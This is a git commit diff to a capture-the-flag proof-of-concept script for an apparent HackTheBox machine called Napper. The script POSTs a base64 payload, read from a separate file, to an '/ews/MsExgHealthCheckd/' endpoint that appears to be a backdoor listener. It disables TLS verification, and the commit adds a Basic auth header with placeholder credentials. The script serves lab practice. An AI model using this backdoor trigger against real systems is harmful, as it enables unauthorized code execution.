13d3e12ff86ab5ed8047dff5a27c31cbf72706d8
fab <59584067+FabFromTheSnow@users.noreply.github.com>
2023-11-12 00:24:50 -0500

    Update poc_nap.py
    adding http basic auth

--- CTFspecific/Napper/poc_nap.py
+++ CTFspecific/Napper/poc_nap.py
@@ -2,6 +2,13 @@ import requests
 from urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 
+
+auth_header = 'Basic ZXhhbXBsZTpFeGFtcGxlUGFzc3dvcmQ='
+
+headers = {
+    'Authorization': auth_header
+}
+
 Hosts = ["napper.htb","app.napper.htb","internal.napper.htb"]
 
 with open('b64', 'r') as file:
@@ -13,10 +20,14 @@ for h in Hosts:
     url_ssl = f"https://{h}/ews/MsExgHealthCheckd/"
 
     try:
-        r_ssl = requests.post(url_ssl, data=form_field, verify=False)
+        r_ssl = requests.post(url_ssl, data=form_field, headers=headers, verify=False)
         print(f"{url_ssl} : {r_ssl.status_code} {r_ssl.headers}")
     except KeyboardInterrupt:
         exit()
     except Exception as e:
         print(e)
         pass
+
+
+
+
